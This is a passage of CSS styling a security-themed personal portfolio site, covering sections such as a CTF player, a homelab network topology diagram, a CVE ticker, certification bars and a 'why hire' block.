    transition:all .15s; display:flex; align-items:center; gap:6px;
  }
  .ctf-github-link:hover { border-color:rgba(200,214,248,0.2); color:var(--text-hi); }
  @media(max-width:760px) {
    .ctf-player-body { grid-template-columns:1fr; }
    .ctf-log-pane { border-right:none; border-bottom:1px solid rgba(255,255,255,0.04); }
    .ctf-player-header { flex-direction:column; }
  }

  /* ── CONTACT ── */
  #contact {
    background: var(--bg);
    border-top: 1px solid var(--border);
    overflow: hidden;
  }
  #contact::before {
    content: '';
    position: absolute; bottom: -20%; right: -10%;
    width: 60%; height: 80%;
    background: radial-gradient(ellipse at center,
      rgba(74,100,220,0.07) 0%, transparent 65%);
    pointer-events: none;
  }
  .contact-cols {
    display: grid; grid-template-columns: 1fr 1fr;
    gap: 5rem; align-items: start;
  }
  .contact-h2 {
    font-family: var(--display); font-size: 3.2rem; font-weight: 700;
    letter-spacing: -.04em; color: var(--text-hi); line-height: 1.02;
    margin-bottom: 1.5rem;
  }
  .contact-text p {
    font-weight: 300; color: var(--text);
    line-height: 1.85; margin-bottom: 1rem;
    font-size: 1rem;
  }
  .contact-text strong { color: var(--text-mid); font-weight: 400; }
  .contact-availability {
    display: flex; align-items: center; gap: 9px;
    margin-top: 1.75rem; font-family: var(--mono);
    font-size: 11px; letter-spacing: .12em; color: var(--green);
    text-transform: uppercase;
  }
  .contact-avail-dot {
    width: 8px; height: 8px; border-radius: 50%;
    background: var(--green);
    box-shadow: 0 0 12px var(--green), 0 0 24px rgba(82,201,122,0.3);
    flex-shrink: 0; animation: blink 2s step-end infinite;
  }

  .link-list {
    border: 1px solid rgba(255,255,255,0.07); border-radius: 10px; overflow: hidden;
    background: rgba(255,255,255,0.015);
  }
  .ext-link {
    display: flex; align-items: center; justify-content: space-between;
    padding: 1.1rem 1.3rem;
    text-decoration: none; border-bottom: 1px solid rgba(255,255,255,0.05);
    transition: background .15s, padding-left .2s var(--ease-out); gap: 1rem;
  }
  .ext-link:last-child { border-bottom: none; }
  .ext-link:hover { background: rgba(200,214,248,0.04); padding-left: 1.6rem; }
  .ext-lbl {
    font-family: var(--mono); font-size: 11px;
    letter-spacing: .1em; text-transform: uppercase;
    color: var(--text-mid); display: block; margin-bottom: 3px; opacity: .85;
  }
  .ext-val {
    font-size: 13.5px; color: var(--text-mid); font-weight: 400;
    transition: color .15s;
  }
  .ext-link:hover .ext-val { color: var(--text-hi); }
  .ext-arr {
    font-size: 13px; color: rgba(255,255,255,0.15);
    transition: color .15s, transform .2s var(--ease-out); flex-shrink: 0;
  }
  .ext-link:hover .ext-arr { color: var(--text-mid); transform: translate(3px,-3px); }

  /* ── SKILLS SNAPSHOT ── */
  .skills-snapshot {
    display: grid; grid-template-columns: 1fr 1fr;
    gap: 0 4rem;
  }
  .snap-col { display: flex; flex-direction: column; gap: 2rem; }
  .snap-group {}
  .snap-cat {
    display: block;
    font-family: var(--mono); font-size: 12px;
    letter-spacing: .1em; text-transform: uppercase;
    color: var(--accent-dim); margin-bottom: .75rem;
    padding-bottom: .5rem;
    border-bottom: 1px solid var(--border);
    opacity: .9;
  }
  .snap-list {
    list-style: none; padding: 0;
    display: flex; flex-direction: column; gap: .4rem;
  }
  .snap-list li {
    font-size: 14px; font-weight: 300;
    color: var(--text-mid); line-height: 1.5;
    padding-left: 1rem; position: relative;
  }
  .snap-list li::before {
    content: '—';
    position: absolute; left: 0;
    color: var(--border-hi);
    font-size: 12px;
  }

  /* ── CURRENTLY WORKING ON ── */
  #now {
    background: var(--surface);
    border-top: 1px solid var(--border);
  }
  .now-narrative {
    margin-bottom: 2.5rem;
  }
  .now-narrative p {
    font-weight: 300; color: var(--text); line-height: 1.9;
    font-size: 1.04rem; max-width: 680px;
  }
  .now-narrative strong { color: var(--accent); font-weight: 500; }
  .now-grid {
    display: grid; grid-template-columns: repeat(3, 1fr);
    gap: 12px;
  }
  .now-item {
    background: rgba(255,255,255,0.02);
    border: 1px solid rgba(255,255,255,0.06);
    border-radius: 10px; padding: 1.6rem;
    display: flex; gap: 1rem; align-items: flex-start;
    transition: background .2s, border-color .2s, transform .2s var(--ease-out);
    position: relative; overflow: hidden;
  }
  .now-item::before {
    content: '';
    position: absolute; top: 0; left: 0; right: 0; height: 2px;
    background: linear-gradient(90deg, transparent, var(--accent-glow), transparent);
  }
  .now-item:hover {
    background: rgba(200,214,248,0.035);
    border-color: rgba(200,214,248,0.12);
    transform: translateY(-2px);
  }
  .now-icon {
    font-size: 11px; color: var(--accent-dim);
    flex-shrink: 0; margin-top: 4px;
    width: 28px; height: 28px;
    display: flex; align-items: center; justify-content: center;
    background: rgba(200,214,248,0.05);
    border: 1px solid rgba(200,214,248,0.1);
    border-radius: 6px;
  }
  .now-title {
    font-family: var(--display); font-size: .95rem; font-weight: 700;
    color: var(--text-hi); letter-spacing: -.015em; margin-bottom: .4rem;
    line-height: 1.3;
  }
  .now-desc {
    font-size: 13px; font-weight: 300; color: var(--text); line-height: 1.7;
  }

  /* ── LAB DIAGRAM ── */
  #lab { background: var(--bg); border-top: 1px solid var(--border); }
  #lab .inner { max-width: 100%; padding: 0 2.5rem; }

  /* Lab stat strip */
  .lab-stats {
    display: flex; align-items: center; gap: 0;
    margin-bottom: 2rem;
    border: 1px solid rgba(255,255,255,0.07);
    border-radius: 8px; overflow: hidden;
    background: rgba(255,255,255,0.015);
    width: fit-content;
  }
  .lab-stat {
    padding: .7rem 1.25rem; display: flex; flex-direction: column;
    gap: .2rem; transition: background .15s;
  }
  .lab-stat:hover { background: rgba(200,214,248,0.03); }
  .lab-stat-n {
    font-family: var(--display); font-size: 1.2rem; font-weight: 700;
    color: var(--text-hi); letter-spacing: -.02em; line-height: 1;
  }
  .lab-stat-l {
    font-family: var(--mono); font-size: 8.5px; letter-spacing: .1em;
    text-transform: uppercase; color: var(--text); opacity: .6;
  }
  .lab-stat-sep {
    width: 1px; height: 36px; background: rgba(255,255,255,0.06); flex-shrink: 0;
  }
  .diagram-wrap {
    border: 1px solid var(--border); border-radius: 6px;
    overflow: hidden; background: #080a10;
    padding: 0;
    width: 100%;
    margin: 0 auto;
  }

  /* ── TOPOLOGY DIAGRAM ── */
  .diagram-wrap {
    background: #010306 !important;
    border: 1px solid rgba(200,214,248,0.1) !important;
    border-radius: 16px !important;
    position: relative; overflow: hidden;
    box-shadow:
      0 40px 100px rgba(0,0,0,0.7),
      0 0 0 1px rgba(255,255,255,0.03),
      inset 0 1px 0 rgba(255,255,255,0.05);
  }
  /* dot-grid background */
  .diagram-wrap::before {
    content: ''; position: absolute; inset: 0; pointer-events: none; z-index: 0;
    background-image: radial-gradient(circle, rgba(200,214,248,0.07) 1px, transparent 1px);
    background-size: 28px 28px;
  }
  /* vignette edges */
  .diagram-wrap::after {
    content: ''; position: absolute; inset: 0; pointer-events: none; z-index: 1;
    background:
      radial-gradient(ellipse 80% 60% at 50% 0%, rgba(74,100,220,0.07) 0%, transparent 60%),
      radial-gradient(ellipse 100% 40% at 0% 50%, rgba(0,0,0,0.5) 0%, transparent 50%),
      radial-gradient(ellipse 100% 40% at 100% 50%, rgba(0,0,0,0.5) 0%, transparent 50%),
      radial-gradient(ellipse 100% 50% at 50% 100%, rgba(0,0,0,0.7) 0%, transparent 50%);
  }
  #topo { padding: 1.75rem 1.75rem 1.5rem; font-family: var(--mono); position: relative; z-index: 2; }

  /* Internet row */
  .topo-internet { display: flex; align-items: center; gap: 1rem; margin-bottom: 1rem; }
  .topo-internet-line { flex: 1; height: 1px; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent); }
  .topo-inet-label {
    font-size: 10px; letter-spacing: .15em; color: rgba(255,255,255,0.3);
    white-space: nowrap; padding: 4px 14px;
    border: 1px solid rgba(255,255,255,0.08); border-radius: 20px;
    background: rgba(255,255,255,0.03);
    text-transform: uppercase;
  }

  /* Hub row */
  .topo-hub-row { display: flex; flex-direction: column; align-items: center; }
  .topo-connector-down {
    width: 1px; height: 20px;
    margin: 0 auto;
  }
  .topo-connector-down.from-inet {
    background: linear-gradient(to bottom, rgba(200,214,248,0), rgba(200,214,248,0.4));
  }
  .topo-connector-down.to-bus {
    background: linear-gradient(to bottom, rgba(200,214,248,0.4), rgba(200,214,248,0));
  }
  .topo-hub {
    width: 100%; max-width: 640px;
    background: linear-gradient(135deg, #0d1f3c 0%, #060e1c 100%);
    border: 1px solid rgba(100,140,255,0.35); border-radius: 12px;
    cursor: pointer; position: relative;
    transition: border-color .25s, box-shadow .25s;
    box-shadow:
      inset 0 1px 0 rgba(255,255,255,0.06),
      0 8px 32px rgba(0,0,0,0.4),
      0 0 0 1px rgba(74,100,220,0.08);
  }
  .topo-hub:hover, .topo-hub.active {
    border-color: rgba(200,214,248,0.6);
    box-shadow: 0 0 40px rgba(100,140,255,0.2), inset 0 1px 0 rgba(255,255,255,0.08), 0 0 0 1px rgba(100,140,255,0.15);
  }
  .topo-hub.active { border-color: #c8d6f8; }
  .topo-hub-accent {
    height: 3px;
    background: linear-gradient(90deg, transparent 0%, #2a3faa 15%, #4a64dc 40%, #c8d6f8 50%, #4a64dc 60%, #2a3faa 85%, transparent 100%);
    border-radius: 12px 12px 0 0;
    animation: shimmer 3s linear infinite;
    background-size: 200% 100%;
  }
  @keyframes shimmer { 0%{background-position:200% 0} 100%{background-position:-200% 0} }
  .topo-hub-inner { display: flex; align-items: center; justify-content: space-between; padding: 1rem 1.25rem; }
  .topo-hub-left { display: flex; align-items: center; gap: 1rem; }
  .topo-hub-icon {
    font-size: 1.6rem; width: 46px; height: 46px; flex-shrink: 0;
    display: flex; align-items: center; justify-content: center;
    background: rgba(74,100,220,0.15); border: 1px solid rgba(74,100,220,0.3); border-radius: 10px;
    box-shadow: 0 0 20px rgba(74,100,220,0.15);
  }
  .topo-hub-name { font-size: 15px; font-weight: 700; color: #e8f0ff; margin-bottom: .25rem; font-family: var(--display); letter-spacing: -.01em; }
  .topo-hub-ip { font-size: 11px; color: #4a6aaa; margin-bottom: .5rem; letter-spacing: .06em; }
  .topo-hub-tags { display: flex; flex-wrap: wrap; gap: 4px; }
  .topo-hub-tags span { font-size: 9px; padding: 2px 7px; background: rgba(74,100,220,0.12); border: 1px solid rgba(74,100,220,0.28); border-radius: 3px; color: #7a9adc; letter-spacing: .07em; }
  .topo-hub-right { display: flex; flex-direction: column; align-items: flex-end; gap: 7px; }
  .topo-hub-status { display: flex; align-items: center; gap: 7px; font-size: 10px; color: #2ecc71; letter-spacing: .12em; padding: 5px 12px; border: 1px solid rgba(46,204,113,0.25); border-radius: 20px; background: rgba(46,204,113,0.06); }
  .topo-hub-hint { font-size: 9px; color: rgba(200,214,248,0.2); letter-spacing: .1em; }
  .topo-pulse { width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; background: #2ecc71; box-shadow: 0 0 8px #2ecc71, 0 0 16px rgba(46,204,113,0.4); animation: topo-pulse-anim 2s ease-in-out infinite; }
  @keyframes topo-pulse-anim { 0%,100%{box-shadow:0 0 4px #2ecc71,0 0 8px rgba(46,204,113,.2)} 50%{box-shadow:0 0 14px #2ecc71,0 0 28px rgba(46,204,113,.45)} }

  /* Bus */
  .topo-bus-row { padding: 0 3.5rem; }
  .topo-bus { position: relative; height: 36px; display: flex; align-items: center; }
  .topo-bus-line {
    position: absolute; left: 0; right: 0; height: 2px;
    background: linear-gradient(90deg, transparent, rgba(200,214,248,0.05) 5%, rgba(200,214,248,0.2) 20%, rgba(200,214,248,0.2) 80%, rgba(200,214,248,0.05) 95%, transparent);
    overflow: visible;
  }
  .topo-bus-line::before { content: ''; position: absolute; inset:-3px 0; background: inherit; filter: blur(6px); opacity: .4; }
  /* animated data packet on bus */
  .topo-bus-line::after {
    content: '';
    position: absolute; top: -2px; width: 40px; height: 6px;
    background: linear-gradient(90deg, transparent, rgba(200,214,248,0.7), transparent);
    border-radius: 3px;
    animation: bus-packet 4s linear infinite;
  }
  @keyframes bus-packet { 0%{left:-40px;opacity:0} 5%{opacity:1} 95%{opacity:1} 100%{left:100%;opacity:0} }

  .topo-bus-drops { display: none; }

  #topo-svg {
    position: absolute; inset: 0; pointer-events: none; z-index: 2;
    width: 100%; height: 100%; overflow: visible;
  }
  .topo-wire { transition: opacity .2s, stroke-width .2s; }
  .topo-wire-label {
    font-family: var(--mono); font-size: 8px; letter-spacing: .08em;
    fill: currentColor; opacity: 0; transition: opacity .2s;
    pointer-events: none;
  }
  #topo:hover .topo-wire-label { opacity: .6; }

  .vlan-pkt {
    font-family: var(--mono); font-size: 9px; letter-spacing: .05em;
    color: var(--vc); opacity: .7; margin-top: 3px;
    min-width: 60px;
  }

  /* Search bar */
  .topo-search-row { display: flex; align-items: center; gap: .75rem; margin-bottom: 1.25rem; }
  #topo-search {
    background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.1);
    border-radius: 6px; padding: 7px 12px 7px 34px;
    font-family: var(--mono); font-size: 12px; color: var(--text-hi);
    outline: none; width: 240px; letter-spacing: .04em;
    transition: border-color .2s, background .2s, box-shadow .2s;
  }
  #topo-search::placeholder { color: rgba(255,255,255,0.2); }
  #topo-search:focus { border-color: rgba(200,214,248,0.3); background: rgba(255,255,255,0.06); box-shadow: 0 0 0 3px rgba(200,214,248,0.05); }
  .topo-search-wrap { position: relative; display: inline-block; }
  .topo-search-icon { position: absolute; left: 11px; top: 50%; transform: translateY(-50%); font-size: 13px; color: rgba(255,255,255,0.25); pointer-events: none; }
  .topo-search-hint { font-family: var(--mono); font-size: 10px; color: rgba(255,255,255,0.18); letter-spacing: .08em; }
  .topo-node.dimmed { opacity: .15; transform: none !important; filter: grayscale(1); }
  .topo-vlan.all-dimmed { opacity: .3; filter: grayscale(.7); }

  /* VLANs */
  .topo-vlans { display: grid; grid-template-columns: repeat(6,1fr); gap: 10px; padding-top: .25rem; }
  .topo-vlan {
    border-radius: 10px; overflow: hidden;
    border: 1px solid rgba(255,255,255,0.06);
    background: rgba(0,0,0,0.35);
    transition: border-color .2s, box-shadow .2s;
    backdrop-filter: blur(4px);
  }
  .topo-vlan:hover {
    border-color: color-mix(in srgb, var(--vc, #888) 35%, rgba(255,255,255,0.06));
    box-shadow: 0 0 30px color-mix(in srgb, var(--vc, #888) 8%, transparent), inset 0 0 20px rgba(0,0,0,0.3);
  }
  .topo-vlan-header {
    padding: .7rem .85rem; border-bottom: 1px solid rgba(255,255,255,0.06);
    background: linear-gradient(180deg, color-mix(in srgb, var(--vc) 9%, rgba(0,0,0,.5)) 0%, rgba(0,0,0,0.2) 100%);
    position: relative;
  }
  .topo-vlan-header::before {
    content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px;
    background: linear-gradient(90deg, transparent, var(--vc), transparent);
    opacity: .7;
  }
  /* subtle inner glow on header */
  .topo-vlan-header::after {
    content: ''; position: absolute; inset: 0;
    background: radial-gradient(ellipse 80% 100% at 50% 0%, color-mix(in srgb, var(--vc) 12%, transparent) 0%, transparent 70%);
    pointer-events: none;
  }
  .topo-vlan-header-top { display: flex; align-items: center; justify-content: space-between; margin-bottom: 4px; }
  .topo-vlan-badge { font-size: 9px; color: var(--vc); letter-spacing: .14em; opacity: .9; text-shadow: 0 0 8px var(--vc); }
  .topo-isolation-tag {
    font-size: 8px; padding: 2px 6px; letter-spacing: .08em;
    background: var(--ic); border: 1px solid var(--ibc); border-radius: 3px;
  }
  .topo-vlan-name { font-size: 12px; color: #d0d8f0; font-weight: 700; letter-spacing: .01em; }

  /* Nodes */
  .topo-vlan-nodes { padding: 7px; display: flex; flex-direction: column; gap: 6px; }
  .topo-node {
    border-radius: 7px; padding: .7rem .75rem .65rem .95rem;
    cursor: pointer; position: relative; overflow: visible;
    border: 1px solid rgba(255,255,255,0.06);
    background: linear-gradient(135deg, rgba(255,255,255,0.035) 0%, rgba(0,0,0,0.3) 100%);
    transition: background .2s, border-color .2s, box-shadow .25s, transform .15s;
    display: flex; align-items: flex-start; gap: .55rem;
    box-shadow: inset 0 1px 0 rgba(255,255,255,0.04);
  }
  .topo-node:hover, .topo-node.active {
    background: linear-gradient(135deg, color-mix(in srgb, var(--vc) 10%, rgba(0,0,0,.2)) 0%, rgba(0,0,0,0.4) 100%);
    border-color: color-mix(in srgb, var(--vc) 50%, transparent);
    box-shadow: 0 4px 20px color-mix(in srgb, var(--vc) 15%, transparent), inset 0 1px 0 rgba(255,255,255,0.06), 0 0 0 1px color-mix(in srgb, var(--vc) 20%, transparent);
    transform: translateY(-2px);
    z-index: 5;
  }
  .topo-node.active { border-color: var(--vc); transform: none; box-shadow: 0 0 24px color-mix(in srgb, var(--vc) 25%, transparent); }

  .topo-node-accent { position: absolute; left: 0; top: 8px; bottom: 8px; width: 2px; background: var(--vc); border-radius: 0 2px 2px 0; opacity: .25; transition: opacity .2s, top .2s, bottom .2s, box-shadow .2s; }
  .topo-node:hover .topo-node-accent, .topo-node.active .topo-node-accent { opacity: 1; top: 3px; bottom: 3px; box-shadow: 0 0 8px var(--vc); }

  .topo-node-status-dot {
    position: absolute; top: 7px; right: 7px;
    width: 5px; height: 5px; border-radius: 50%;
    background: var(--sc); box-shadow: 0 0 6px var(--sc), 0 0 12px color-mix(in srgb, var(--sc) 40%, transparent);
    animation: topo-pulse-anim 2.5s ease-in-out infinite;
  }

  .topo-node-icon {
    font-size: 1rem; flex-shrink: 0;
    width: 26px; height: 26px; display: flex; align-items: center; justify-content: center;
    background: color-mix(in srgb, var(--vc) 10%, rgba(0,0,0,.3));
    border: 1px solid color-mix(in srgb, var(--vc) 22%, transparent);
    border-radius: 5px; margin-top: 1px;
    box-shadow: inset 0 1px 0 rgba(255,255,255,0.05);
  }
  .topo-node-info { flex: 1; min-width: 0; }
  .topo-node-name { font-size: 11px; font-weight: 700; color: #d8e4ff; margin-bottom: 2px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; letter-spacing: -.005em; }
  .topo-node-ip { font-size: 9px; color: rgba(100,130,180,0.7); margin-bottom: 5px; letter-spacing: .05em; }
  .topo-node-tags { display: flex; flex-wrap: wrap; gap: 2px; }
  .topo-node-tags span {
    font-size: 8px; padding: 1px 5px; letter-spacing: .06em;
    background: color-mix(in srgb, var(--vc) 9%, rgba(0,0,0,.4));
    border: 1px solid color-mix(in srgb, var(--vc) 20%, transparent);
    border-radius: 3px; color: color-mix(in srgb, var(--vc) 80%, #aaa);
  }
    border: 1px solid color-mix(in srgb, var(--vc) 20%, transparent);
    border-radius: 2px; color: color-mix(in srgb, var(--vc) 60%, #8090b0);
  }

  /* ── SLIDE-IN DETAIL PANEL ── */
  .topo-panel {
    position: absolute; top: 0; right: -340px; width: 320px;
    height: 100%; background: linear-gradient(160deg, #0b1525 0%, #080e1c 100%);
    border-left: 1px solid rgba(200,214,248,0.12);
    padding: 1.5rem 1.25rem; overflow-y: auto;
    transition: right .3s cubic-bezier(.16,1,.3,1);
    z-index: 20; box-shadow: -12px 0 40px rgba(0,0,0,0.5);
    border-radius: 0 12px 12px 0;
  }
  .topo-panel.open { right: 0; }
  .topo-panel-close {
    position: absolute; top: 1rem; right: 1rem;
    background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
    color: #6a7898; font-size: 12px; width: 26px; height: 26px;
    border-radius: 4px; cursor: pointer; display: flex; align-items: center; justify-content: center;
    transition: background .15s, color .15s;
  }
  .topo-panel-close:hover { background: rgba(255,74,90,0.15); border-color: rgba(255,74,90,0.3); color: #ff4a5a; }
  .topo-panel-header { display: flex; align-items: center; gap: .75rem; margin-bottom: .85rem; padding-right: 2rem; }
  .topo-panel-bigicon { font-size: 1.6rem; width: 44px; height: 44px; display: flex; align-items: center; justify-content: center; background: rgba(200,214,248,0.06); border: 1px solid rgba(200,214,248,0.1); border-radius: 8px; flex-shrink: 0; }
  .topo-panel-title { font-size: 13px; font-weight: 700; color: #e4eeff; font-family: var(--display); margin-bottom: .2rem; }
  .topo-panel-ip { font-size: 9px; color: #3a5070; letter-spacing: .1em; font-family: var(--mono); }
  .topo-panel-role { font-size: 11px; color: #8090b8; line-height: 1.6; font-style: italic; margin-bottom: .85rem; }
  .topo-panel-divider { height: 1px; background: rgba(200,214,248,0.07); margin: .75rem 0; }
  .topo-panel-body { font-size: 11px; color: #5a6a88; line-height: 1.8; }
  .topo-panel-section-label { font-size: 8px; letter-spacing: .14em; color: #2a3a58; margin-bottom: .4rem; }
  .topo-panel-tags { display: flex; flex-wrap: wrap; gap: 4px; }
  .topo-panel-tags span { font-size: 9px; padding: 2px 8px; background: rgba(100,140,255,0.1); border: 1px solid rgba(100,140,255,0.22); border-radius: 3px; color: #6a8acc; letter-spacing: .04em; }
  .topo-panel-connects { font-size: 10px; color: #4a6888; line-height: 1.6; font-family: var(--mono); }

  /* ── PROGRESS BAR ── */
  #progress-bar {
    position: fixed; top: 0; left: 0; z-index: 9999;
    height: 2px; width: 0%;
    background: linear-gradient(90deg, #4a8fff 0%, #c8d6f8 40%, #f5c842 70%, #c8d6f8 100%);
    background-size: 200% 100%;
    animation: shimmer 2.5s linear infinite;
    transition: width .1s linear;
    pointer-events: none;
    box-shadow: 0 0 8px rgba(200,214,248,0.3);
  }
  @keyframes shimmer { 0%{background-position:200% 0} 100%{background-position:-200% 0} }

  /* ── ANIMATIONS ── */
  @keyframes up {
    from { opacity: 0; transform: translateY(18px); }
    to   { opacity: 1; transform: none; }
  }

  /* ── THREAT TICKER ── */
  #ticker-wrap {
    background: #07090f;
    border-bottom: 1px solid rgba(255,74,90,0.2);
    overflow: hidden; height: 32px;
    display: flex; align-items: center;
  }
  #ticker-label {
    flex-shrink: 0;
    font-family: var(--mono); font-size: 10px; font-weight: 500;
    color: #ff4a5a; letter-spacing: .12em;
    padding: 0 16px; border-right: 1px solid rgba(255,74,90,0.25);
    height: 100%; display: flex; align-items: center; gap: 7px;
    background: #0a0508;
  }
  #ticker-label::before {
    content: ''; width: 6px; height: 6px; border-radius: 50%;
    background: #ff4a5a;
    animation: blink .9s step-end infinite;
  }
  #ticker-track {
    flex: 1; overflow: hidden; position: relative;
  }
  #ticker-inner {
    display: flex; align-items: center; gap: 0;
    white-space: nowrap;
    animation: ticker-scroll 55s linear infinite;
  }
  .ticker-item {
    font-family: var(--mono); font-size: 10px;
    color: #4a5578; padding: 0 40px;
  }
  .ticker-item span { color: #6a7598; }
  .ticker-item .ticker-cve { color: #ff8a5a; }
  .ticker-item .ticker-hi  { color: #7a9abf; }
  @keyframes ticker-scroll { 0%{transform:translateX(0)} 100%{transform:translateX(-50%)} }

  /* ── SIDE NAV DOTS ── */
  #side-nav {
    position: fixed; right: 20px; top: 50%;
    transform: translateY(-50%);
    display: flex; flex-direction: column; gap: 10px;
    z-index: 100;
  }
  .sn-dot {
    width: 6px; height: 6px; border-radius: 50%;
    background: var(--border-hi);
    cursor: pointer; transition: all .2s;
    position: relative;
  }
  .sn-dot::after {
    content: attr(data-label);
    position: absolute; right: 16px; top: 50%;
    transform: translateY(-50%);
    font-family: var(--mono); font-size: 10px;
    color: var(--text-hi); letter-spacing: .08em;
    white-space: nowrap; opacity: 0;
    background: var(--surface2); padding: 3px 8px; border-radius: 3px;
    border: 1px solid var(--border-hi);
    pointer-events: none; transition: opacity .15s;
  }
  .sn-dot:hover::after { opacity: 1; }
  .sn-dot.active {
    background: var(--accent);
    box-shadow: 0 0 8px rgba(200,214,248,0.5);
    transform: scale(1.5);
  }
  @media (max-width: 900px) { #side-nav { display: none; } }

  /* ── KEYBOARD SHORTCUT MODAL ── */
  #kbd-modal {
    display: none; position: fixed; inset: 0; z-index: 9000;
    background: rgba(5,8,16,0.85); backdrop-filter: blur(8px);
    align-items: center; justify-content: center;
  }
  #kbd-modal.open { display: flex; }
  #kbd-inner {
    background: #0c0f1a; border: 1px solid var(--border-hi);
    border-radius: 10px; padding: 2rem 2.5rem; min-width: 380px;
    box-shadow: 0 32px 80px rgba(0,0,0,0.7);
  }
  #kbd-inner h3 {
    font-family: var(--display); font-size: 1.1rem; font-weight: 600;
    color: var(--text-hi); margin-bottom: 1.25rem;
    display: flex; justify-content: space-between; align-items: center;
  }
  #kbd-close { cursor: pointer; color: var(--text); font-size: 1.2rem; background: none; border: none; }
  .kbd-row {
    display: flex; justify-content: space-between; align-items: center;
    padding: .5rem 0; border-bottom: 1px solid var(--border);
    font-size: 13px;
  }
  .kbd-row:last-child { border-bottom: none; }
  .kbd-row span { color: var(--text); }
  kbd {
    font-family: var(--mono); font-size: 10px;
    background: var(--surface2); color: var(--text-mid);
    border: 1px solid var(--border-hi); border-radius: 4px;
    padding: 3px 8px; letter-spacing: .04em;
  }

  /* ── CURSOR DOT ── */
  #cursor-dot {
    position: fixed; width: 6px; height: 6px; border-radius: 50%;
    background: rgba(200,214,248,0.8); pointer-events: none;
    z-index: 9998; transform: translate(-50%,-50%);
    transition: transform .1s, background .2s;
    mix-blend-mode: screen;
  }
  #cursor-ring {
    position: fixed; width: 28px; height: 28px; border-radius: 50%;
    border: 1px solid rgba(200,214,248,0.25); pointer-events: none;
    z-index: 9997; transform: translate(-50%,-50%);
    transition: transform .18s cubic-bezier(.16,1,.3,1), width .2s, height .2s, border-color .2s;
  }
  #cursor-ring.hovering {
    width: 44px; height: 44px;
    border-color: rgba(200,214,248,0.5);
  }
  @media (hover: none) { #cursor-dot, #cursor-ring { display: none; } }

  /* ── CERT STATUS WIDGET ── */
  .cert-widget {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 6px; padding: 1.25rem 1.5rem;
    font-family: var(--mono); font-size: 12px;
  }
  .cert-widget-title {
    font-size: 10px; letter-spacing: .1em; text-transform: uppercase;
    color: var(--accent-dim); margin-bottom: 1rem;
  }
  .cert-row {
    display: flex; align-items: center; gap: .75rem;
    padding: .45rem 0; border-bottom: 1px solid var(--border);
  }
  .cert-row:last-child { border-bottom: none; }
  .cert-name { flex: 1; color: var(--text-mid); font-size: 12px; }
  .cert-bar-wrap { width: 100px; height: 4px; background: var(--border-hi); border-radius: 2px; overflow: hidden; }
  .cert-bar { height: 100%; border-radius: 2px; transition: width 1.2s cubic-bezier(.16,1,.3,1); width: 0; }
  .cert-bar.amber { background: #f5c842; }
  .cert-bar.blue  { background: #4a8fff; }
  .cert-bar.green { background: #2ecc71; }
  .cert-pct { font-size: 12px; color: var(--text-mid); width: 32px; text-align: right; }
  .cert-status { font-size: 9px; letter-spacing: .08em; }

  /* ── COPY BUTTON ── */
  .copy-btn {
    background: none; border: none; cursor: pointer;
    font-family: var(--mono); font-size: 10px;
    color: var(--text); letter-spacing: .06em;
    padding: 3px 8px; border-radius: 3px;
    border: 1px solid var(--border);
    transition: all .15s; margin-left: .5rem;
  }
  .copy-btn:hover { border-color: var(--border-hi); color: var(--text-hi); }
  .copy-btn.copied { color: #2ecc71; border-color: #2ecc71; }

  /* ── EASTER EGG ── */
  #egg {
    display: none; position: fixed; inset: 0; z-index: 9999;
    background: #000; align-items: center; justify-content: center;
    flex-direction: column;
  }
  #egg.open { display: flex; }
  #egg-text {
    font-family: var(--mono); font-size: 13px; color: #2ecc71;
    line-height: 1.8; text-align: center; white-space: pre;
  }


  /* ── WHY HIRE MATTHEW ── */
  #why {
    background: var(--bg);
    border-top: 1px solid var(--border);
    position: relative; overflow: hidden;
  }
  #why::before {
    content: '';
    position: absolute; top: -30%; left: 30%; right: -10%;
    height: 120%;
    background: radial-gradient(ellipse at center, rgba(82,201,122,0.04) 0%, transparent 65%);
    pointer-events: none;
  }
  .why-headline {
    font-family: var(--display);
    font-size: clamp(1.5rem, 3vw, 2.5rem);
    font-weight: 700; letter-spacing: -.03em;
    color: var(--text-hi); margin-bottom: .75rem; line-height: 1.1;
  }
  .why-sub {
    font-size: 1rem; font-weight: 300; color: var(--text);
    line-height: 1.7; max-width: 500px; margin-bottom: 3rem;
  }
  .why-grid {
    display: grid; grid-template-columns: repeat(3, 1fr);
    gap: 1.5rem;
  }
  .why-card {
    border: 1px solid rgba(255,255,255,0.07);
    border-radius: 12px; padding: 1.75rem 1.5rem;
    background: rgba(255,255,255,0.015);
    position: relative; overflow: hidden;
    transition: border-color .2s, transform .2s var(--ease-out), background .2s;
  }
  .why-card:hover {
    border-color: rgba(200,214,248,0.18);
    transform: translateY(-3px);
    background: rgba(200,214,248,0.03);
  }
  .why-card-accent {
    position: absolute; top: 0; left: 0; right: 0; height: 2px;
    border-radius: 2px 2px 0 0;
  }
  .why-card:nth-child(1) .why-card-accent { background: linear-gradient(90deg, transparent, var(--green), transparent); }
  .why-card:nth-child(2) .why-card-accent { background: linear-gradient(90deg, transparent, var(--accent), transparent); }
  .why-card:nth-child(3) .why-card-accent { background: linear-gradient(90deg, transparent, var(--amber), transparent); }
  .why-num {
    font-family: var(--mono); font-size: 11px;
    letter-spacing: .12em; color: var(--text-mid); opacity: .65;
    margin-bottom: 1rem;
  }
  .why-icon {
    font-size: 1.5rem; margin-bottom: .75rem; display: block;
  }
  .why-title {
    font-family: var(--display); font-size: 1.05rem; font-weight: 700;
    color: var(--text-hi); letter-spacing: -.02em; margin-bottom: .6rem;
    line-height: 1.2;
  }
  .why-body {
    font-size: 13.5px; font-weight: 300; color: var(--text);
    line-height: 1.75;
  }
  .why-body strong { color: var(--accent); font-weight: 500; }
  .why-proof {
    display: inline-flex; align-items: center; gap: 6px;
    margin-top: 1rem;
    font-family: var(--mono); font-size: 10px;
    letter-spacing: .1em; text-transform: uppercase;
    color: var(--green); opacity: .8;
  }
  .why-proof::before {
    content: '✓'; font-size: 10px;
  }

  /* ── ENHANCED SKILL BARS ── */
  .skill-bars-section {
    margin-top: 2rem;
  }
  .skill-bar-group {
    margin-bottom: 1.75rem;
  }
  .skill-bar-label {
    display: flex; justify-content: space-between; align-items: center;
    margin-bottom: .4rem;
  }
  .skill-bar-name {
